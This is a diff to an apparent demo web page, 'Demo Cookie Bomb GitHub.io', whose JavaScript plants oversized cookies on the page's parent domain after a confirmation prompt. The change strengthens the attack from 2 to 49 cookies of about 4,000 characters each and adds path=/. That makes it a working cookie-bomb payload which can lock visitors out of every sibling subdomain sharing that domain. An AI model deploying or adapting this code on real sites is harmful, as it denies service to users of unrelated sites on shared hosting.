@@ -5,9 +5,9 @@
 function CookieBomb() {
     var base_domain = document.domain.substr(document.domain.indexOf('.'));
     var pollution = Array(4000).join('a');
-    if(confirm('Should I Cookie Bomba '+base_domain+'?')){
-    for(var i=1;i<3;i++){
-        document.cookie='bomb'+i+'='+pollution+';domain='+base_domain;
+    if(confirm('Should I Cookie Bomb '+base_domain+'?')){
+    for(var i=1;i<50;i++){
+        document.cookie='bomb'+i+'='+pollution+';domain='+base_domain+';path=/';
     }
 }
 }
@@ -17,7 +17,4 @@ function CookieBomb() {
 
 <h2>Demo Cookie Bomb GitHub.io</h2>
 
-<button type="button" onclick="CookieBomb()">Bombardi me</button>
-
-</body>
-</html> 
+<button type="button" onclick="CookieBomb()">Bombardea me</button>
